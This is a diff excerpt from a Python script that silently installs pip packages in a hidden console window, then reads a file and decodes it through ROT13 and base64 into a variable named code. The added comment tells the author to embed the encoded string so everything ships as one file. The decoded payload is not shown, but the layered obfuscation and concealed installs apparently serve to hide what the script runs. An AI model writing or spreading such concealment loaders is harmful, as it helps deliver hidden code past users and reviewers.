@@ -18,6 +18,8 @@ for req in reqs:
     make = 'pip3 install ' + req
     subprocess.run(make, creationflags=0x08000000)
 
+    
+# TO MAKE IT ALL A SINGLE FILE REPLACE THE open().read() WITH THE ENCODED STRING
 r13code = open('encoded.txt', 'r').read()
 b64code = codecs.decode(r13code, 'rot_13')
 code = base64.b64decode(b64code.encode('utf-8')).decode('utf-8')
